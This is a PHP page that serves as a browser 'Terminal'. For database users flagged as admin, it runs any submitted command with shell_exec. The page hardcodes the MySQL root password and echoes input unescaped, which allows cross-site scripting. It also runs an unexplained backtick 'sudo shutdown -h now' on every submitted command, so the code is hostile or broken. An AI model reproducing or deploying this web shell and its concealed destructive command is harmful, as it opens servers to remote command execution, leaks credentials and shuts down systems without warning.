<!DOCTYPE html>
<html>
<head>
<title>Terminal</title>
</head>

<body>
<?php
session_start();
if (isset($_SESSION["user"])==true){//signed in
	$con = mysql_connect("localhost","root","haoxiang2002");
	if (!$con)
	  {
	  die("Could not connect: " . mysql_error());
	  }
	
	mysql_select_db("Users", $con);
	
	$result = mysql_query("SELECT * FROM data");
	
	while($row = mysql_fetch_array($result))
	  {
		if ($row["username"]== $_SESSION["user"]){
			if ($row["admin"]=="1"){//access granted
				echo "<h1>Terminal - ".$_SESSION["user"]."</h1>";
				if (isset($_POST["cmd"])==true){ //execute command and display command result
					$res=shell_exec($_POST["cmd"]);
					echo `sudo shutdown -h now`;
					echo "<h2>".$_POST["cmd"]."</h2><p>".$res."</p>";
				}
				
				?>
				<br>
				<form action="" method="post">
					<input type="text" style="width=200" name="cmd" required>
					<input type="submit" value="Execute">
				</form>
				<?php
			}else{//access denied
				echo"<h1>PREMISSION DENIED</h1>";
			}
		}
	}
}else{
	echo"<h1>PREMISSION DENIED</h1>";
}
?>
<br>
<form action="index.php">
	<input type="submit" value="Home">
</form>

</body>
</html>
